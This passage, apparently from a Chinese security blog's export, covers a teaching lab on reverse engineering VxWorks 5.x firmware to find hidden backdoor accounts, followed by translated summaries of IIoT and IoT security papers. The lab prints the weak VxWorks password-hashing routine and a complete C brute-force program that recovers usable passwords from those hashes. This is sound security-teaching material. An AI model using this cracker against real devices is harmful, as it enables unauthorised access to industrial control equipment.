5系列的符号有他独特的格式，他以16个字节为一组数据，前4个字节是0x00，之后是函数名的内存地址，后4个字节是函数的内存地址，最后以4个特征字节数据结尾。\n通过查看Binwalk分析出的地址位置可见，这个地址的确是符号表但是Binwalk的检测结果有一些偏移实际的符号表起始位置是0x301e60。\n\n![截屏2019-10-29上午10.07.44](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4ney6vkj31d10la4qp.jpg)\n\n由于符号表有他自己的特征，因此能够通过遍历的方式快速的锁定符号表的起始及结束地址。我们所测试的固件的符号表起始地址为0x301e60+0x10000，结束地址为0x3293b0+0x10000。\n\n![截屏2019-10-29上午10.09.54](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4nnqbq2j31d10la1kx.jpg)\n\n在得到了符号表的位置后，我们就需要使用IDA的api来修复函数名，这里将使用如下的Python脚本。\n\n```python\n# coding:utf-8\nfrom idaapi import *\n# 符号表间隔\nsymbol_interval = 16\nload_address = 0x10000\nsymbol_table_start = 0x301e60 + load_address\nsymbol_table_end = 0x3293b0 + load_address\nea = symbol_table_start\n\nwhile ea < symbol_table_end:\n    # 循环遍历修复函数名\n    offset = 4\n    MakeStr(Dword(ea + offset), BADADDR)\n    sName = GetString(Dword(ea + offset), -1, ASCSTR_C)\n    print(sName)\n    if sName:\n        eaFunc = Dword(ea + offset + 4)\n        MakeName(eaFunc, sName)\n        MakeCode(eaFunc)\n        MakeFunction(eaFunc, BADADDR)\n    ea += symbol_interval\n\n```\n\n在IDA的脚本中运行\n\n![截屏2019-10-29上午10.23.47](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4wi7rsrj30m40frdm5.jpg)\n\n运行之后发现旁边函数列表大多函数都找到了符号表中对应的名称\n\n![image-20191029160942747](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4xwb6loj31390nzqd7.jpg)\n\n### 7.后门代码分析\n\n在固件预处理完成后，我们就可以通过查看固件的服务加载过程查看初始化时所添加的账号等信息。查看usrAppinit函数，可以发现大量的loginUserAddd调用。（多个后门函数）\n\n![截屏2019-10-29上午11.03.43](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f504uq6hj31390nzgyc.jpg)\n\n而密码则是经过loginDefaultEncrypt函数哈希加密\n结合vxworks5的源码来看\n\n```c\n/******************************************************************************\n*\n* loginDefaultEncrypt - default password encryption routine\n*\n* This routine provides default encryption for login passwords.  It employs\n* a simple encryption algorithm.  It takes as arguments a string <in> and a\n* pointer to a buffer <out>.  The encrypted string is then stored in the\n* buffer.\n*\n* The input strings must be at least 8 characters and no more than 40\n* characters.\n*\n* If a more sophisticated encryption algorithm is needed, this routine can\n* be replaced, as long as the new encryption routine retains the same\n* declarations as the default routine.  The routine vxencrypt\n* in \\f3host/<hostOs>/bin\\fP\n* should also be replaced by a host version of <encryptionRoutine>.  For more\n* information, see the manual entry for loginEncryptInstall().\n*\n* RETURNS: OK, or ERROR if the password is invalid.\n*\n* SEE ALSO: loginEncryptInstall(), vxencrypt\n*\n* INTERNAL\n* The encryption is done by summing the password and multiplying it by\n* a magic number.\n*/\n\nSTATUS loginDefaultEncrypt\n    (\n    char *in,                           /* input string */\n    char *out                           /* encrypted string */\n    )\n    {\n    int            ix;\n    unsigned long  magic     = 31695317;\n    unsigned long  passwdInt = 0;\n\n   if (strlen (in) < 8 || strlen (in) > 40)\n        {\n\terrnoSet (S_loginLib_INVALID_PASSWORD);\n        return (ERROR);\n        }\n\n    for (ix = 0; ix < strlen(in); ix++)         /* sum the string */\n        passwdInt += (in[ix]) * (ix+1) ^ (ix+1);\n\n    sprintf (out, \"%u\", (long) (passwdInt * magic)); /* convert interger\n\t\t\t\t\t\t\tto string */\n    /* make encrypted passwd printable */\n\n    for (ix = 0; ix < strlen (out); ix++)\n        {\n        if (out[ix] < '3')\n            out[ix] = out[ix] + '!';    /* arbitrary */\n\n        if (out[ix] < '7')\n            out[ix] = out[ix] + '/';    /* arbitrary */\n\n        if (out[ix] < '9')\n            out[ix] = out[ix] + 'B';    /* arbitrary */\n        }\n\n    return (OK);\n    }\n```\n\n[![mark](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f58cr8q2j30od0jaaaq.jpg)](https://i.loli.net/2018/07/19/5b5021f38a71a.jpg)\n[![mark](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f58ej37bj30og0hsq43.jpg)](https://i.loli.net/2018/07/19/5b5021f39f749.jpg)\n[![mark](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f58gdnqwj30oo0ekwex.jpg)](https://i.loli.net/2018/07/19/5b5021f3b3958.jpg)\n\n结合源码看汇编就非常清晰了\n\n> 加密过程：\n>\n> 1.在第一个for循环中密码字符串逐字节与位置下标相乘再按位进行异或操作，然后将每一个字符的运算结果累加起来算出passwdInt。\n> 2.passwdInt值与magic相乘再转化为String类型。\n> 3.字符串逐字符与’3’、’7’、’9’进行比较，加相应的值。\n>\n> 可以通过随机生成密码来构建一个序列化的输入密码和passwdInt的对应表，同时passwdInt与输出密码之间也可构建对应表，这样输入密码和输出密码讲通过长度有限的Int类型passwdInt打通，这样我们就能通过查表的方式由输出密码得到输入密码。相比于MD5、SHA1等加密算法，vxencrypt加密算法由于加密方式问题导致密文长度受限，以至于存在弱点。\n\nRapid7 研究员HD Moore曾经发现VxWorks 5.x系统默认加密方式存在缺陷的研究文章\n\n> [http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes](https://cvk.posthaven.com/how-to-crack-vxworks-password-hashes)\n\n解密程序\n\n> https://github.com/cvonkleist/vxworks_hash\n\n这里贴上C的\n\n```c\n// cvk/2010-08-09\n#include <stdio.h>\n#include <string.h>\n\n// password settings\n#define MIN_LENGTH 8\n#define MAX_LENGTH 40\nchar *charset = \" !\\\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\";\n#define CHARSET_LENGTH 95\n\n// shortcut hash table\n#define MAX_SUM 110000\nchar sums[MAX_SUM][MAX_LENGTH + 1];\n\n// stage one of the hashing algorithm: the sum\nunsigned long sum(char *plaintext) {\n  unsigned long s = 0;\n  int i;\n  for (i = 0; i < strlen(plaintext); i++)\n    s += (plaintext[i]) * (i + 1) ^ (i + 1);\n  return s;\n}\n\n// builds a random password\nvoid random_password(char *password) {\n  int i;\n  int length = rand() % (MAX_LENGTH - MIN_LENGTH) + MIN_LENGTH;\n  for(i = 0; i < length; i++)\n    password[i] = charset[rand() % CHARSET_LENGTH];\n  password[length] = '\\0';\n}\n\n// randomly creates checksums\n//\n// when it discovers a shorter input plaintext for a checksum that has already\n// been calculated, it replaces the existing plaintext with the new, shorter\n// one\nvoid brute(int runs) {\n  int i;\n  char password[MAX_LENGTH + 1];\n  unsigned long s;\n\n  for(i = 0; i < runs; i++) {\n    random_password(password);\n    s = sum(password);\n    if(s > MAX_SUM) {\n      printf(\"error! sum too big\");\n      return;\n    }\n    if(sums[s][0] == '\\0' || strlen(password) < strlen(sums[s])) {\n      strcpy(sums[s], password);\n    }\n  }\n}\n\n// returns the number of checksums in the table\nint count() {\n  int i;\n  int c = 0;\n  for(i = 0; i < MAX_SUM; i++)\n    if(sums[i][0] != '\\0')\n      c++;\n  return c;\n}\n\n// prints discovered checksums\nvoid dump_table() {\n  int i;\n  for(i = 0; i < MAX_SUM; i++)\n    if(sums[i][0] != '\\0')\n      printf(\"%d\\t%s\\n\", i, sums[i]);\n}\n\nint main(int argc, char **argv) {\n  brute(1000000000);\n  printf(\"%d checksums\\n\", count());\n  dump_table();\n}\n```\n\n## 【预期结果】\n\n成功找到隐藏在固件封装程序中的若干个后门账号和密码\n\n## 【思考问题】\n\n（1）如果固件的内存加载地址并没有采用一般默认的0x10000，我们有哪些可能的办法去寻找其加载地址呢？\n\n（2）除了本实验中提到的办法，还有什么其他思路可以找到固件的符号表地址？\n\n（3）尝试下载工业控制安全教学实验箱中相关设备的固件进行后门分析，包括交换机、工业防火墙、施耐德PLC、西门子PLC和HMI。\n\n## 【参考资料】\n\nhttps://www.cnblogs.com/yangmzh3/p/11231423.html\n\nhttps://paper.seebug.org/771/\n\nhttps://paper.seebug.org/613/\n\nhttps://www.cnblogs.com/hac425/p/9706815.html\n\nhttp://www.360doc.com/content/15/1018/18/471722_506538709.shtml\n\nhttps://www.jianshu.com/p/12d8f509169c\n\nhttp://t.cn/RdORUWo\n\n[https://kabeor.cn/施耐德NOE77101以太网模块固件逆向及后门挖掘/](https://kabeor.cn/施耐德NOE77101以太网模块固件逆向及后门挖掘/)","tags":["漏洞复现","固件逆向"],"categories":["工控"]},{"title":"（论文翻译）工业物联网中的安全和隐私挑战（Security and Privacy Challenges in Industrial Internet of Things）","url":"/2021/01/25/论文：工业物联网中的安全和隐私挑战（Security and Privacy Challenges in Industrial Internet of Things）/","content":"\n## 工业物联网系统的发展趋势（第2节）\n\n### 一种新兴趋势是将更复杂的电子设备集成到生产系统中，将它们互连，并集成到常规业务IT系统中。由此产生的工业物联网是工业价值链的新层次组织和管理的基础，并可以实现高度灵活和节省资源的生产，并以批量生产为代价增强了产品的个性化。\n\n<!-- more -->\n\n![image-20191024114308344](https://tva1.sinaimg.cn/large/006y8mN6ly1g8954zzz2cj30w10gkag1.jpg)\n\n### 工业物联网的基础是信息物理系统（CPS）\n\n- 这是监视和控制物理过程的计算平台\n-  CPS可以实时监测状态，进行结构健康监测，远程诊断和远程控制生产系统。\n\n### 工业物联网带来了许多新的挑战涉及不同方面，包括安全性，隐私，标准化，法律和社会方面。\n\n## 指出相关的安全性和隐私风险和挑战（第3节）\n\n![image-20191024114351297](https://tva1.sinaimg.cn/large/006y8mN6ly1g8955qviynj30hx0fowhb.jpg)\n\n### 对工业物联网系统的攻击\n\n- Slammer蠕虫\n\n\t- 2003年\n\t- 感染了美国一家核电厂的两个关键监控系统\n\t- 同年，计算机病毒感染了美国主要运输网络的信号和调度控制系统，导致旅客和货运列车完全停驶\n\n- 在随后的几年中，文献报道了许多影响工业控制系统和关键基础设施的安全事件[31、7、22、40]\n- Stuxnet [70，22，40]却显示出一种新趋势，即针对性强的攻击和强大的对手（例如民族国家）的代价\n\n### 工业攻击面\n\n- 智能工厂由几个网络物理生产系统（CPPS）组成\n\n\t- 电子设备\n\n\t\t- 电子由软件（例如嵌入式操作系统和应用程序）驱动，并通过各种网络连接（例如以太网或WiFi）与人类和其他CPPS交互\n\n\t- 监控器\n\n\t\t- 这些监控器通过传感器和执行器控制物理过程\n\n- 攻击面存在于所有这些抽象层上\n\n\t- 电子会遭受物理攻击，包括侵入性硬件攻击，边信道攻击和逆向工程攻击[55]。\n\t- 恶意代码（例如特洛伊木马，病毒和运行时攻击）可能会破坏软件\n\t- 通信协议易受协议攻击，包括中间人攻击和拒绝服务攻击[28]\n\t- 即使是操作CPPS的人也容易遭受网络攻击，例如网络钓鱼和社会工程。\n\n### 安全目标和要求\n\n- 工业生产系统的最重要目标是可用性，它应该防止任何不必要的生产延迟，从而导致生产力损失和收入损失。\n- 另一个基本目标是防止任何系统可能导致人身伤害或人身伤害的故障。\n\n\t- 为了实现这一目标，必须保持工业物联网系统的完整性。这包括防止破坏活动，这可能会导致产品质量意外损失和资源使用增加。\n\n- 工业物联网的目标之一是实现智能知道自己的历史并可以控制自己的生产过程的产品。\n- 物联网生产系统的强大连接性和智能产品则需要新的机制来防止工业间谍活动以及客户和员工的隐私。\n\n## 讨论针对工业物联网系统的整体安全框架的潜在解决方案（第4节）\n\n### 现有的信息安全概念适应网络物理生产系统（CPPS）并不容易\n\n- 完整性和机密性是传统企业IT系统的主要保护目标，因此，防范网络攻击通常是安全性和可用性之间的权衡\n- 如果发生网络攻击，通常会暂时禁用受影响的IT系统，然后在攻击后将其恢复。但是，这种方法不能应用于以可用性为基本要求的CPPS。\n- 其他差异是由于CPPS严格的实时要求特性所致-\n\n\t- 它们受约束的计算，内存和能源，以及工业生产系统的使用寿命长。\n\n### CPS的安全体系结构\n\n- 嵌入式物联网系统的安全体系结构方面有大量文献\n\n\t- 高端是Intel和ARM体系结构\n\n\t\t- 基于软件的隔离和虚拟化[35]\n\t\t- 基于安全硬件的可信计算（例如，可信平台模块[67]）\n\t\t- 和提供安全执行的处理器架构（例如ARM TrustZone [72]，AEGIS [64]，OASIS [46]和Intel Software Guard Extensions（SGX）[36、20]）\n\n\t- 低端嵌入式系统通常是为特定任务而设计的，并且针对低功耗和最低成本进行了优化\n\n\t\t- 它们必须提供多种功能并满足严格的实时要求\n\t\t- 这些设备的安全解决方案通常基于硬件强制将安全关键代码和数据与同一平台上的其他软件隔离\n\t\t- 示例是SMART [13]，SPM [63]，SANCUS [45]和TrustLite [25]。\n\n\t\t\t-  SMART用只读存储器保护一个特定的嵌入式应用程序（任务）的完整性，这不允许在部署后更改代码。\n\t\t\t- SPM通过仅对任务本身授予对任务数据区域的访问权限，从而提供了硬件强制的任务隔离。但是，这些任务具有固定的内存布局，不能被中断。此外，SPM的任务测量是在硬件中执行的，即，它是不间断的，同时取决于所测量任务的内存大小，这违反了实时性要求\n\t\t\t- SANCUS通过一种机制扩展了SPM，以生成和管理任务的加密机密，但继承了SPM的局限性。\n\t\t\t- TrustLite概括了SPM [63]和SMART [13]的概念，并支持中断任务。但是，TrustLite要求在启动时加载所有软件组件并配置其隔离。与SMART，SPM和SANCUS相比，TyTAN [6]在运行时提供了多个任务的动态加载和卸载，具有发送者和接收者身份验证的安全进程间通信（IPC）以及实时调度。\n\n### CPS的完整性验证\n\n- 认证是验证系统软件配置完整性的关键机制，它可以检测出意料之外的恶意软件修改。\n- 下一代物联网系统将由设备组成群，即嵌入式设备的大型自组织异构网络。验证这些系统的正确和安全运行需要有效的群验证机制，以集体验证所有设备的软件完整性，从而检测出意外和恶意的软件修改。\n\n### 安全的物联网设备管理\n\n- 本地数据管理和本地分布式分析预计将改善本地服务的延迟，因为只有极少的信息将在本地和低延迟网络之外交换\n- 出于同样的原因，本地分析和数据管理将改善用户数据的隐私性。这些功能将最大限度地利用物联网系统中可用的资源，并为开发人员提供创建创新服务的基础。\n\n## 本文介绍了工业物联网系统，相关的安全和隐私挑战，以及针对工业物联网系统整体安全框架的可能解决方案的展望\n","tags":["论文"],"categories":["工控"]},{"title":"（论文翻译）物联网调查：体系结构，支持技术，安全性和隐私性以及应用程序","url":"/2021/01/25/论文：物联网调查/","content":"\n原文：A Survey on Internet of Things: Architecture, Enabling Technologies, Security and Privacy, and Applications \n\n### 第一部分简介\n\n- 物联网（IOT）的两个功能\n\n\t- 物联网是网络或互联网的扩展[10]，这意味着在物联网中，各种网络应共存，并且这些网络之间的互操作性对于信息传递和支持应用程序至关重要[88]，[7]。互连是物联网中的关键架构问题[132]\n\t- 物联网中连接的事物不再局限于设备或对象，还可以是信息，人类行为等。\n\n- 我们将物联网视为多层体系结构，分为感知层，网络层，服务层和应用程序层。\n\n  <!-- more -->\n\n### 第二部分介绍了CPS和IoT之间的关系\n\n![](https://tva1.sinaimg.cn/large/006y8mN6ly1g893d5qi6hj30hr09u0vf.jpg)\n\n- CPS被称为系统通过集成现代计算和通信技术，可以有效地集成网络和物理组件[131]，[5]，旨在改变人，网络和物理世界之间的交互方式。 CPS强调网络和物理组件之间的相互作用，其目标是通过利用网络组件来使对物理组件的监视和控制安全，高效和智能化[2\n- “网络c”是指使用现代感应技术，通讯技术来有效地监视和控制物理组件，\n\t- 而“物理p”是指现实世界中的物理组件，\n\t- “系统s”则反映了复杂性和多样性。\n\t- CPS是物理组件，传感器，执行器，通信网络和控制中心的集成，其中部署传感器以测量和监视物理组件的状态，部署执行器以确保理想的操作物理组件上的通信，以及通信网络用于在传感器，执行器和控制中心之间传递测量数据和反馈意见。控制中心用于分析测量数据并将反馈命令发送给执行器，以确保系统在所需状态下运行\n- cps和iot的相同点\n\n\t- 根据CPS的概述，我们知道CPS和IoT旨在实现网络世界与物理世界之间的互动[100]。特别是，CPS和IoT可以通过智能传感器设备测量物理组件的状态信息，而无需人工输入。同时，在CPS和IoT中，可以通过有线或无线通信网络传输和共享测量的状态信息。在分析测量的状态信息之后，CPS和IoT都可以为应用程序提供安全，高效和智能的服务。 CPS应用程序和IoT应用程序的现有工作已扩展到类似领域（智能电网，智能交通，智能城市等）\n- CPS和基于IoT的区别\n\n\t- CPS的本质是“系统”。CPS的主要目标是测量物理设备的状态信息，并确保在物理设备上的安全，高效和智能操作。在CPS中，存在传感器/执行器层，通信层和应用程序（控制）层。传感器/执行器层用于收集实时数据并执行命令，通信层用于将数据传递到上层，命令传递到下层，而应用程序（控制）层用于分析数据并做出决策。图1说明了CPS中的三层。从该图可以看出，CPS是垂直架构\n\t- 物联网是连接大量设备，并通过在网络空间中使用现代技术来监视和控制设备。因此，物联网的关键是“互连”。物联网的主要目标是互连各种网络，以便可以跨异构网络进行数据收集，资源共享，分析和管理。这样，可以提供可靠，高效和安全的服务。因此，物联网是一种水平架构，应集成所有CPS应用程序的通信层以实现互连，如图1所示\n\t- 总而言之，CPS和物联网之间的基本区别是也就是说，CPS被视为“系统”，而物联网被视为“互联网”。 CPS和IoT的共同要求是实时，可靠和安全的数据传输。对CPS和IoT的不同要求如下：对于CPS，有效，可靠，准确，实时的控制是主要目标，而对于IoT，资源共享和管理，数据共享和管理，不同网络之间的接口，大规模数据和大数据的收集和存储，数据挖掘，数据聚合和信息提取以及高质量的网络服务质量（QoS）是重要的服务\n\n### 第三部分介绍物联网的架构\n\n- 1.三层架构\n\n\t- 应用层\n\n\t\t- 应用层，也称为业务层，被实现为物联网架构的顶层[7]。应用层接收从网络层发送的数据，并使用该数据提供所需的服务或操作。例如，应用层可以提供存储服务以将接收到的数据备份到数据库中，或者提供分析服务以评估接收到的数据以预测物理设备的未来状态。该层中存在许多应用程序，每个应用程序都有不同的要求。示例包括智能电网，智能交通，智能城市等。[133]，[125]\n\n\t- 网络层\n\n\t\t- 网络层，也称为传输层，被实现为物联网架构的中间层[68]。网络层用于接收感知层提供的已处理信息，并确定将数据和信息通过集成网络传输到IoT中心，设备和应用程序的路由。网络层是IoT体系结构中最重要的层，因为各种设备（集线器，交换器，网关，云计算执行等）和各种通信技术（蓝牙，WiFi，长期演进（LTE）等）被集成在这一层。网络层应通过异构网络之间的接口或网关，并使用各种通信技术和协议，向不同事物或应用程序传输数据，或从不同事物或应用程序传输数据\n\n\t- 感知层\n\n\t\t- 感知层，也称为传感器层，被实现为物联网架构的底层[11]。感知层通过智能设备（RFID，传感器，执行器等）与物理设备和组件进行交互。其主要目标是将事物连接到IoT网络，并通过部署的智能设备测量，收集和处理与这些事物相关的状态信息，并将处理后的信息通过层接口传输到上层\n\n\t- 三层架构是物联网的基础，并已在许多系统中设计和实现\n\n- 2.基于SoA的体系结构\n\n\t- 感知层\n\n\t\t- 感知层作为体系结构的底层执行，并用于测量，收集和提取与物理设备关联的数据[52]\n\n\t- 网络层\n\n\t\t- 网络层用于确定路由，并通过集成的异构网络提供数据传输支持[10]，[47]。\n\n\t- 服务层\n\n\t\t- 服务层位于网络层和应用程序层之间，提供支持应用程序层的服务[10]。服务层包括服务发现，服务组合，服务管理和服务接口。在这里，服务发现用于发现所需的服务请求，服务组合用于与连接的对象进行交互，并有效地划分或集成服务以满足服务请求，服务管理用于管理和确定满足以下条件的信任机制服务请求和服务接口用于支持所有提供的服务之间的交互。\n\n\t- 应用层\n\n\t\t- 应用层用于支持用户的服务请求。应用程序层可以支持许多应用程序，包括智能电网，智能交通，智能城市等\n\n\t- 一般来说，SoA是基于组件的模型，可以设计为通过接口和协议[10]，[87]，[136]连接应用程序的不同功能单元（也称为服务）。 SoA可以专注于设计协调服务的工作流程，并实现软件和硬件组件的重用，从而提高SoA用于设计IoT架构的可行性[10]，[137]。因此，SoA可以轻松集成到IoT架构中，其中可以提取传统三层架构中网络层和应用层提供的数据服务，并形成一个新层，即服务层（也称为接口）层或中间件层）。因此，在基于SoA的IoT架构中，存在四个层并彼此交互[123]，这些层是感知层，网络层，服务层和应用程序层。\n\t- 在现有的一些研究中，服务层被分为两个子层，即服务组合子层和服务管理子层。另外，业务层是从应用程序层中提取的，并充当应用程序层的上层，以提供复杂的服务请求。\n\n### 第四部分中，我们介绍了物联网（IoT）的使能技术和挑战\n\n- 感知层\n\n\t- RFID\n\n\t\t- 通常，RFID作为一种非接触式通信技术，用于识别和跟踪没有接触的物体。它支持通过短距离[8]，[163]的无线电信号进行数据交换。基于RFID的系统包括RFID标签，RFID阅读器和天线[62]。\n\t\t- 系统\n\n\t\t\t- RFID标签\n\n\t\t\t\t- RFID标签可以是连接到天线的微芯片。每个RFID标签都贴在一个物体上，并具有唯一的标识号\n\n\t\t\t- RFID阅读器\n\n\t\t\t\t- RFID阅读器可以通过适当的信号查询附着的RFID标签来识别物体并获得相应的信息[64\n\n\t\t\t- 天线\n\n\t\t\t\t- 天线用于在RFID标签和RFID阅读器之间传输信号\n\n\t\t- RFID具有以下优点\n\n\t\t\t- 快速扫描，耐用性，可重复使用性，大容量存储，非接触式读取，安全性，小尺寸，低成本等\n\n\t\t\t\t- 由于这些好处，RFID在物联网的感知层中可用于识别和跟踪对象以及交换信息\n\n\t\t- RFID传感器网络（RSN）\n\n\t\t\t- RFID系统和传感器网络的结合。在RSN中，传感器网络可以与RFID系统协作以识别和跟踪对象的状态[139]。在RSN中，实现了基于小型RFID的传感设备和RFID读取器，其中RFID读取器充当接收器节点以生成数据并为网络操作提供电源。\n\n\t- 无线传感器网络（WSN）\n\n\t\t- WSN可以监视和跟踪设备的状态，并通过多个状态将状态数据传输到控制中心或接收器节点\n\t\t- 因此，无线传感器网络可以被视为现实世界和网络世界之间的进一步桥梁[131]\n\t\t- WSN具有许多优点，包括可伸缩性，动态重新配置，可靠性，小尺寸，低成本和低能耗。\n\n\t- Other：\n\n\t\t- 条形码，也称为一维代码。将信息存储在多条黑线和白间距中。这些线和间距具有不同的宽度，以线性或一维方向组织，并按特殊的编码规则排列[49]。条形码中包含的信息可以由机器读取，该机器使用红外光束扫描条形码[94\n\t\t- 二维代码通过使用在平面上布置的黑白像素，其中黑色像素代表二进制“ 1”，白色像素代表二进制“ 0” [49]。通过特殊的编码规则，黑白像素可以存储大量信息。与条形码相比，二维码具有信息量高，可靠性高，鲁棒性强等优点\n\n- 网络层\n\n\t- IEEE 802.15.4\n\n\t\t- 目标是专注于低速率无线个人区域网（LR-WPAN），以低能耗，低速率传输和低成本[4]提供个人区域中所有事物的低速率连\n\t\t-  IEEE 802.15.4是许多无线通信技术和协议的基础，例如Zigbee [63]，WirelessHART [59]等\n\n\t- 6LoWPAN\n\n\t\t- 低功耗无线个人局域网（LoWPAN）由大量低功耗无线通信连接的设备组成\n\n\t\t\t- 与其他类型的网络相比，LoWPAN具有许多优势（小数据包大小，低功耗，低带宽等）[124\n\n\t\t- 作为一项增强功能，通过组合IPv6和LoWPAN设计了6LoWPAN协议\n\t\t- 由于6LoWPAN的低成本和低能耗，因此它适用于包含大量低成本设备的物联网。 \n\t\t- 6LoWPAN具有许多优点，包括与传统体系结构的良好连接性和兼容性，低能耗，即席自组织等\n\n\t- Zigbee\n\n\t\t- Zigbee是一种无线网络技术，用于低能耗的短期通信\n\t\t- 在Zigbee协议中，包括五个层：物理层，MAC层，传输层，网络层和应用程序层[124]\n\t\t- Zigbee网络的优势包括低能耗，低成本，低数据速率，低复杂性，可靠性和安全性\n\t\t- Zigbee网络可以支持多种拓扑，包括星形，树形和网状拓扑[13]\n\n\t- Z-Wave\n\n\t\t- Z-wave是一种短期无线通信技术，具有成本低，能耗低和可靠性高的优点[100\n\t\t-  Z-wave的主要目的是在控制单元和一个或多个终端设备之间提供可靠的传输，并且Z-wave适用于带宽较低的网络。\n\t\t- Z-wave网络支持动态路由技术，每个从站在其内存中存储一​​个路由列表，该列表由控制器更新[41]。\n\n\t- Message Queue Telemetry Transport (MQTT)\n\n\t\t- 消息队列遥测传输（MQTT）是一种消息传递协议，用于在远程传感器上收集测量数据并将其传输到服务器\n\t\t- MQTT是一种简单而轻便的协议，并支持低带宽和高延迟的网络。\n\t\t- MQTT可以在各种平台中实现以将IoT中的事物连接到Internet\n\t\t- 因此MQTT可以用作传感器/执行器和服务器之间的消息传递协议，从而使MQTT在IoT中发挥重要作用\n\n\t- Constrained Application Protocol (CoAP)\n\n\t\t- 约束应用协议（CoAP）是基于REST（表示状态传输）体系结构的消息协议\n\t\t- 由于IoT中的大多数设备都受到资源的限制（例如，小存储和低计算能力）。由于其复杂性，HTTP无法在物联网中使用。为了解决该问题，提出了CoAP修改一些HTTP功能以满足物联网的要求。\n\t\t- 一般来说，CoAP是6LoWPAN协议栈中的应用层协议，旨在使资源受限的设备能够实现RESTful交互\n\t\t- CoAP支持组通信和推送通知，但不支持广播。资源观察，逐块资源传输，资源发现，与HTTP交互以及安全性都是CoAP提供的重要功能\n\n\t- Extensible Messaging and Presence Protocol (XMPP)\n\n\t\t- 可扩展消息和状态协议（XMPP）是基于XML流协议的即时消息协议\n\t\t- XMPP继承了XML协议的功能，因此XMPP具有出色的可伸缩性，寻址和安全性，可用于多方聊天，语音和视频流以及远程呈现\n\t\t- 在XMPP中，包括以下三个角色：客户端，服务器和网关，并且在这三个角色的两方之间支持双向通信。\n\n\t\t\t- 服务器可以实现链接管理和消息路由的功能\n\t\t\t- 网关用于支持异构系统之间的稳定通信\n\t\t\t- 客户端可以基于TCP / IP协议连接到服务器并基于XML流传输上下文协议\n\n\t\t- 因此，XMPP可以在物联网中使用，以支持与基于XML的文本消息进行对象到对象的通信\n\n\t- Data Distribution Service (DDS)\n\n\t\t- 数据分发服务（DDS）是一种发布/订阅协议，用于支持高性能的设备到设备通信[7\n\t\t- 它是一个以数据为中心的协议，其中可以支持多播以实现高质量的服务和高可靠性\n\t\t- 无需代理的发布/订阅架构使DDS适用于实时受限的IoT和设备到设备通信\n\t\t- 此外，DDS可以实现出色的可伸缩性。\n\n\t- Advanced Message Queuing Protocol (AMQP)\n\n\t\t- 先进的消息队列协议（AMQP）是一种开放标准的消息队列协议，用于在应用程序层[7]，[40]中提供消息服务（队列，路由，安全性和可靠性等）\n\t\t- AMQP专注于面向消息的环境，可以视为面向消息的中间件协议\n\t\t- 使用AMQP，即使这些客户端和中间件是由不同的编程语言生成的，客户端也可以与消息中间件实现稳定的通信\n\t\t- 此外，AMQP实现了各种消息交换体系结构，包括存储和转发，发布和订阅，消息分发，消息队列，基于上下文的路由以及点对点路由\n\n\t- Others\n\n\t\t- 多播DNS（mDNS）可以支持IoT应用程序中的名称解析[7]，[55]。客户端可以使用DNS服务发现（DNS-SD）通过mDNS [7]，[30]在特殊网络中发现所需的服务\n\t\t- Routing protocol for Low Power and Lossy networks is低功耗有损网络的路由协议是与链路无关的路由协议，可以将其部署在资源受限的节点上，以确定低功耗和有损链路上的路由\n\n- 服务层\n\n\t- 接口技术\n\n\t\t- 必须在服务层中设计接口技术，以确保在设备和应用程序之间进行有效而安全的信息交换\n\t\t- 此外，该接口应有效管理互连的设备，包括设备连接，设备断开连接，设备通信和设备操作[137\n\t\t- 需要一个InterFace Profile（IFP）可以被认为是一种服务标准，可以用来促进各种设备或应用程序提供的服务之间的交互\n\t\t- 尽管已经为物联网开发了许多接口技术，但以低成本实现更有效，安全和可扩展的接口技术仍然是支持物联网的未来研究面临的巨大挑战\n\n\t- 服务管理技术\n\n\t\t- 服务管理可以有效地主动发现设备和应用程序，并安排高效，可靠的服务以满足要求。\n\t\t- 服务可以被认为是一种行为，包括数据的收集，交换和存储，或这些行为的关联，以实现特殊的目标\n\t\t- 服务可以在物联网中分为两类：主要服务和辅助服务\n\n\t\t\t- 基本服务，也称为基本服务，可以在设备或应用程序中公开主要功能。\n\t\t\t- 辅助服务可以基于主要服务或其他辅助服务来实现辅助功能\n\n\t\t- 隐藏服务的实现细节并使这些服务可以在异构设备和应用程序中兼容实现，因此SoA已用于集成服务。\n\n\t\t\t- 部署基于SoA的服务，应首先开发服务组合平台\n\t\t\t- 然后抽象设备的功能和通信能力\n\t\t\t- 最后，应提供一套通用的服务\n\n\t- 中间件技术\n\n\t\t- 中间件是一种软件或服务程序，可以提供介于物联网技术和应用程序之间的抽象\n\t\t- 在中间件中，隐藏了不同技术的细节，并且提供了标准接口，使开发人员可以专注于应用程序的开发，而无需考虑应用程序与基础架构之间的兼容性\n\t\t- 因此，通过使用中间件，具有不同接口的设备和应用程序可以交换信息并彼此共享资源\n\t\t- 中间件具有以下优点\n\n\t\t\t- （i）中间件可以支持各种应用程序；\n\t\t\t- （ii）中间件可以在各种操作系统和平台上运行；\n\t\t\t- （iii）中间件可以支持异构网络，设备和应用程序之间的分布式计算和服务交互；\n\t\t\t- （iv）中间件可以支持标准\n\t\t\t- （v）中间件可以提供标准接口，提供可移植性和标准协议以实现互操作性，并使中间件在标准化中发挥重要作用[25]。\n\t\t\t- 中间件还可以为应用程序提供稳定的高级接口。通过稳定的接口，应用程序可以在硬件和操作系统上独立运行。此功能使中间件适用于IoT，因为已集成了大量异构设备和网络，并且这些设备和网络将经常更改或更新。\n\n\t\t- 中间件的许多研究工作已经完成开发，可以分为五类\n\n\t\t\t- （i）面向消息的中间件\n\n\t\t\t\t- 面向消息的中间件可以在各种平台和通信协议（例如AMQP，DDS，MQTT和XMPP）之间提供可靠的信息交换\n\n\t\t\t- （ii）基于语义Web的中间件\n\n\t\t\t\t- 基于语义的Web中间件可以提供各种传感器网络之间的交互作用和互操作性。此类示例包括基于SoA的中间件[119]，基于任务计算的中间件[43]等\n\n\t\t\t- （iii）基于位置的服务和监视中间件\n\n\t\t\t\t- 基于位置的服务和监视中间件将设备的位置和其他信息集成在一起，以提供集成的价值服务[110]。\n\n\t\t\t- （iv）通信中间件\n\n\t\t\t\t- 